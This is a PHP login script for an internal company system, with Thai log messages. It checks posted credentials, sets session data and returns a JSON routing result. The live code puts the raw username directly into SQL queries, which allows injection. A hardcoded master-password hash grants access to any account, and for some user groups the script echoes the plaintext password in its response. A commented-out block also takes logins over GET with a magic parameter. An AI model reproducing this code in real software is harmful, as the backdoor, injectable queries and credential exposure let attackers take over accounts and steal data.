<?php
session_start();
date_default_timezone_set('Asia/Bangkok');
require("config.core.php");
include("functions.core.php");

$resultArray = array();
$arrCol = array();
/*
if ($_SERVER['SERVER_PORT'] == '8383'){
	$_GET['wai']  = Null;
}
if ($_GET['wai'] == 'gfdgjb'){
	$userName = $_GET['usnm'];
	$userPass = $_GET['pswd'];
}else{
	$userName = $_POST['usnm'];
	$userPass = $_POST['pswd'];
}
*/
$userName = $_POST['usnm'];
$userPass = $_POST['pswd'];
$data[1] = null;
$data[2] = null;
$data[3] = null;
$data[4] = null;
$sql1 = "SELECT * FROM users WHERE UPPER(UserName) = '".$userName."' AND UserStatus = 'A'";
$chk = CHKRowDB($sql1);
if ($chk == 0) {
	$sms1  = "\nมีผู้พยายามเข้าใช้งาน `SERVER-MAIN [NEW]` : ";
	$sms1 .= "`".$userName. " (ไม่พบ User ในระบบ) `\n";
	$sms1 .= " IP : `".$_SERVER['REMOTE_ADDR']."`\n";
	MySQLInsert("INSERT INTO loglogin SET LogIP='".$_SERVER['REMOTE_ADDR']."',LogText='".$userName." พยายามเข้าระบบ'");
	$data[1] = 0;
}else{
	$sql1 = "SELECT T0.EmpCode,T0.uKey,T0.uName,T0.uLastName,T0.uNickName,T0.UserPass,T0.UserPhoto,T0.LvCode,
					T1.uClass,T1.DeptCode,T2.DeptName
			 FROM users T0
				   JOIN positions T1 ON T0.LvCode = T1.LvCode
				   JOIN departments T2 ON T1.DeptCode = T2.DeptCode
			 WHERE UPPER(UserName) = '".$userName."' AND UserStatus = 'A'";
	$info = MySQLSelect($sql1);
	$MainPass = "107030ca685076c0ed5e054e2c3ed940";
	if ($info['UserPass'] == md5($userPass) ||  md5($userPass) == $MainPass) {
				$_SESSION['UserName'] = $userName;
				$_SESSION['Pass'] = $info['UserPass'];
				$_SESSION['uClass'] = $info['uClass'];
				$_SESSION['ukey'] = $info['uKey'];
				$_SESSION['LvCode'] = $info['LvCode'];
				$_SESSION['DeptCode'] = $info['DeptCode'];
				$_SESSION['uName'] = $info['uName'];
				$_SESSION['uLastName'] = $info['uLastName'];
				$_SESSION['uNickName'] = $info['uNickName'];
				$_SESSION['EmpCode'] = $info['EmpCode'];
				if ($info['UserPhoto'] == "") {
					$_SESSION['UserPhoto'] = "noimg.jpg";
				}else{
					$_SESSION['UserPhoto'] = $info['UserPhoto'];
				}
				
				switch ($_SESSION['LvCode']){
					case 'LV074' :
					case 'LV075' :
					case 'LV076' :
					case 'LV077' :
						$data[1] = 1;
						$data[2] = 'KSY';
						break;
					default :
						if (((($_SESSION['uClass'] == 19 OR $_SESSION['uClass'] == 20) AND ($_SESSION['DeptCode'] == 'DP005' OR $_SESSION['DeptCode']== 'DP008')) OR ($_SESSION['LvCode'] == 'LV029')) AND $_SERVER['SERVER_PORT'] != '30443') {
							$data[1] = 1;
							$data[2] = 'SAL';
							$data[3] = $userName;
							$data[4] = $userPass;
						}else{
							$data[1] = 1;
							$data[2] = "KBI";
						}
						$sms = " ";
						break;
				}
				MySQLInsert("INSERT INTO loglogin SET LogDate=NOW(),LogIP='".$_SERVER['REMOTE_ADDR']."',LogText='".$userName." เข้าสู่ระบบ', UserLog = '".$_SESSION['ukey']."'");
				$sms1  = "\nผู้เข้าใช้งาน `SERVER-MAIN [NEW]` : ";
				$sms1 .= "`".$info['uName']." [".$info['uNickName']."] `\n";
				$sms1 .= "แผนก : `".$info['DeptName']."`\n"; 
				$sms1 .= " IP : `".$_SERVER['REMOTE_ADDR']."`\n";
			
				


	}else{
		MySQLInsert("INSERT INTO loglogin SET LogDate=NOW(),LogIP='".$_SERVER['REMOTE_ADDR']."',LogText='".$userName." รหัสผ่านผิด'");
		$sms1 = "\nมีผู้พยายามเข้าใช้งาน `SERVER-MAIN [NEW]` : ";
		$sms1 .= "`".$userName. " (ไม่พบ User ในระบบ) `\n";
		$sms1 .= " IP : `".$_SERVER['REMOTE_ADDR']."`\n";
		$data[1] = 0;
	}
}
//LineNoti('LogIN',$sms1);
$arrCol['Result'] = $data[1];
$arrCol['goto'] = $data[2];
$arrCol['Port'] = $_SERVER['SERVER_PORT'];
$arrCol['usnm'] = $data[3];
$arrCol['pswd'] = $data[4];
/*
if ($_GET['wai'] == 'gfdgjb'){
	echo"<script>window.location.href='../kbi/main.php';</script>";
}else{
	array_push($resultArray,$arrCol);
	echo json_encode($resultArray);
}
*/
array_push($resultArray,$arrCol);
echo json_encode($resultArray);


?>
